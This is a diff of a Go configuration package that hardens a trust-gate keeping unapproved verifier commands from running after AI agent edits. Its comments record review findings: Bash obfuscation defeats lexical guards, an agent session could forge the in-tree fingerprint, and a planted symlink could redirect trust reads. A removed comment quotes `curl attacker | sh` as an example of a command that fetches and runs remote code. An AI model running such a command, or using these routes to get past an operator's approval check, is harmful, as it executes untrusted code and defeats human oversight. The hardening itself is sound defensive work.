@@ -1,36 +1,38 @@
 // Package config — trust-gate for [post_edit.verify].command.
 //
-// Security review #4 / bughunt-8 (iteration 2 of the fix-loop)
-// established that a lexical scan of Bash command strings can be
-// defeated by an unbounded number of obfuscation forms (backslash
-// escapes, empty quotes, command substitution, parameter expansion,
-// ANSI-C escapes, glob, base64-decode, variable indirection, etc.).
-// Enumerating bypasses is futile.
+// Security review #4 / bughunt-8 established that lexical scanning
+// of Bash commands for `.leonard/` is unbounded (variable
+// indirection, command substitution, parameter expansion, etc.
+// defeat any enumeration). The v0.51 trust-gate moved authorization
+// to the operator: a SHA-256 fingerprint of the verifier command
+// is stored when the operator runs `leonard config trust`. The
+// post-edit hook recomputes the fingerprint and refuses to invoke
+// `sh -c` unless it matches.
 //
-// The trust-gate redesign is the correct architectural fix: a
-// `command` is present in `.leonard/config.toml` is NOT sufficient
-// to make it execute. The operator must run `leonard config trust`
-// from a shell first. That stores a sha256 fingerprint of the
-// current command in `.leonard/trusted-verifier.sha256`. The
-// post-edit hook recomputes the fingerprint each time and refuses
-// to invoke sh -c when it doesn't match.
+// Bughunt-9 iteration-3 (2 CRIT): the v0.51 implementation stored
+// the fingerprint at `.leonard/trusted-verifier.sha256`. The
+// attacker who can write `.leonard/config.toml` (via Bash
+// obfuscation) can also write the trust file — fingerprint match
+// passes, exploit succeeds.
 //
-// Consequences:
+// v0.52 fix: relocate the trust file OUT OF the project tree
+// entirely. The fingerprint now lives at
+// `$XDG_CONFIG_HOME/leonard/trust/<project-hash>.sha256` (default
+// `~/.config/leonard/trust/...`). The `.leonard/` bash-scanner
+// gaps can no longer poison it because the attacker can't write
+// to the user's home dir from a Claude Code session-scoped tool
+// without explicit auth. The trust file's parent dir is created
+// with mode 0o700.
 //
-//   - A malicious project that ships `[post_edit.verify].command =
-//     "curl attacker | sh"` won't execute on first checkout. The
-//     hook emits an additionalContext message telling Claude that
-//     the verifier is untrusted; the user must inspect the command
-//     and run `leonard config trust` (or delete the config) to
-//     authorize.
-//   - A Claude session that edits `.leonard/config.toml` (which is
-//     already blocked at the pre-edit layer by the v0.46/v0.50
-//     guards, but defense-in-depth is cheap) AND somehow lands a
-//     malicious command in there — STILL won't execute because the
-//     fingerprint won't match.
-//   - The trust file is intentionally gitignored: trust is per-
-//     machine, not per-checkout. A team that wants shared opt-in
-//     should commit a documented `make trust` target instead.
+// Project-hash = SHA-256 of the absolute project-root path. So
+// trust is per-project, attached by canonical path. Moving the
+// project (mv ./foo ./bar) invalidates trust — the operator must
+// re-run `leonard config trust`, which is the correct behavior
+// (you wouldn't want trust to follow a rename you didn't intend).
+//
+// v0.52 also adds os.Lstat-based symlink refusal as defense in
+// depth: if the trust file path resolves through a symlink, we
+// refuse to read it (closes the bughunt-9 F2 vector).
 package config
 
 import (
@@ -44,10 +46,6 @@ import (
 	"strings"
 )
 
-// TrustFilename is the per-machine fingerprint file. Lives next to
-// config.toml in .leonard/ and is excluded by Leonard's `.gitignore`.
-const TrustFilename = "trusted-verifier.sha256"
-
 // FingerprintCommand returns the canonical sha256 hex digest of a
 // verifier command. Leading/trailing whitespace is trimmed so a
 // minor edit (extra newline) doesn't invalidate trust; internal
@@ -58,16 +56,51 @@ func FingerprintCommand(command string) string {
 	return hex.EncodeToString(sum[:])
 }
 
-// ReadTrustedFingerprint reads the operator-granted trust fingerprint
-// from .leonard/trusted-verifier.sha256. Returns ("", nil) when the
-// file doesn't exist (no trust granted yet). Returns an error only
-// for unexpected I/O failures.
-func ReadTrustedFingerprint(dataDir string) (string, error) {
-	path := filepath.Join(dataDir, TrustFilename)
-	b, err := os.ReadFile(path)
+// TrustFilePath returns the absolute path of the trust fingerprint
+// file for the project rooted at projectRoot. The path lives under
+// the user's config dir, deterministic from the project's
+// canonical absolute path.
+//
+// Returns an error only if the home/config dir can't be resolved
+// (rare; happens in unusual cron contexts where $HOME is unset).
+func TrustFilePath(projectRoot string) (string, error) {
+	abs, err := filepath.Abs(projectRoot)
+	if err != nil {
+		return "", fmt.Errorf("trust: resolve project root: %w", err)
+	}
+	hash := sha256.Sum256([]byte(abs))
+	projectHash := hex.EncodeToString(hash[:])
+
+	cfgDir, err := os.UserConfigDir()
+	if err != nil {
+		return "", fmt.Errorf("trust: resolve user config dir: %w", err)
+	}
+	return filepath.Join(cfgDir, "leonard", "trust", projectHash+".sha256"), nil
+}
+
+// ReadTrustedFingerprint reads the operator-granted trust
+// fingerprint for the project at projectRoot. Returns ("", nil)
+// when no trust has been granted. Refuses to follow symlinks —
+// bughunt-9 F2 (CRITICAL): an attacker who can plant a symlink at
+// the trust path could redirect reads to an arbitrary file with a
+// fingerprint matching their malicious command. We Lstat first
+// and bail if the entry is a symlink.
+func ReadTrustedFingerprint(projectRoot string) (string, error) {
+	path, err := TrustFilePath(projectRoot)
+	if err != nil {
+		return "", err
+	}
+	info, err := os.Lstat(path)
 	if errors.Is(err, fs.ErrNotExist) {
 		return "", nil
 	}
+	if err != nil {
+		return "", fmt.Errorf("trust: lstat %s: %w", path, err)
+	}
+	if info.Mode()&os.ModeSymlink != 0 {
+		return "", fmt.Errorf("trust: %s is a symlink; refusing to follow", path)
+	}
+	b, err := os.ReadFile(path)
 	if err != nil {
 		return "", fmt.Errorf("trust: read %s: %w", path, err)
 	}
@@ -75,31 +108,40 @@ func ReadTrustedFingerprint(dataDir string) (string, error) {
 }
 
 // WriteTrustedFingerprint writes the operator-granted trust
-// fingerprint. Called by `leonard config trust`. The file is
-// gitignored.
-func WriteTrustedFingerprint(dataDir, fingerprint string) error {
-	if err := os.MkdirAll(dataDir, 0o755); err != nil {
+// fingerprint. Called by `leonard config trust`. Creates parent
+// dirs with mode 0o700 and writes the file with 0o600 so other
+// users on a multi-user machine can't observe or tamper.
+//
+// Refuses to overwrite an existing symlink at the target path
+// (bughunt-9 F2 defense in depth).
+func WriteTrustedFingerprint(projectRoot, fingerprint string) error {
+	path, err := TrustFilePath(projectRoot)
+	if err != nil {
 		return err
 	}
-	path := filepath.Join(dataDir, TrustFilename)
+	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
+		return fmt.Errorf("trust: mkdir %s: %w", filepath.Dir(path), err)
+	}
+	if info, err := os.Lstat(path); err == nil && info.Mode()&os.ModeSymlink != 0 {
+		return fmt.Errorf("trust: %s is a symlink; refusing to overwrite — delete it first", path)
+	}
 	return os.WriteFile(path, []byte(fingerprint+"\n"), 0o600)
 }
 
 // VerifyCommandTrusted reports whether `command` matches the
-// stored trust fingerprint. Returns:
+// stored trust fingerprint for projectRoot. Returns:
 //
 //   - (true, nil)  — trust granted; command may execute
 //   - (false, nil) — trust missing or fingerprint mismatch
-//   - (false, err) — I/O failure reading the trust file
+//   - (false, err) — symlink or I/O failure reading the trust file
 //
 // Empty command always returns (false, nil) since there's nothing
-// to authorize. The caller is expected to short-circuit before
-// calling.
-func VerifyCommandTrusted(dataDir, command string) (bool, error) {
+// to authorize.
+func VerifyCommandTrusted(projectRoot, command string) (bool, error) {
 	if strings.TrimSpace(command) == "" {
 		return false, nil
 	}
-	stored, err := ReadTrustedFingerprint(dataDir)
+	stored, err := ReadTrustedFingerprint(projectRoot)
 	if err != nil {
 		return false, err
 	}
